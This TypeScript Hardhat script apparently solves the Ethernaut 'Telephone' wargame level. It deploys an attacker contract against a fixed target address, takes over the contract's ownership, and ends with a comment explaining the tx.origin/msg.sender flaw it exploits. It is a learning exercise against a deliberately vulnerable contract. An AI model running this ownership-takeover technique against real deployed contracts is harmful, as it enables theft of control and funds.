import { Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/4.Telephone/Telephone.sol/Telephone.json";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xdEB35DDbD42D6D2216ea1BacA9b9486BD897B6f7";

async function main() {
  const [attacker] = await ethers.getSigners();
  const TelephoneAttacker = await deployContract(
    "TelephoneAttacker",
    attacker,
    [targetAddress]
  );
  const TelephoneTarget = new Contract(targetAddress, abi, attacker);
  const pendingTx = await TelephoneAttacker.attack();
  await pendingTx.wait();

  const owner = await TelephoneTarget.connect(attacker).owner();
  displayResult(owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
The Telephone contract has a function called changeOwner(address) that can be used only if
the msg.sender is different from the tx.origin (EOA sending the transaction). Since we call this function directly from a contract
the inequality is satisfied.
*/
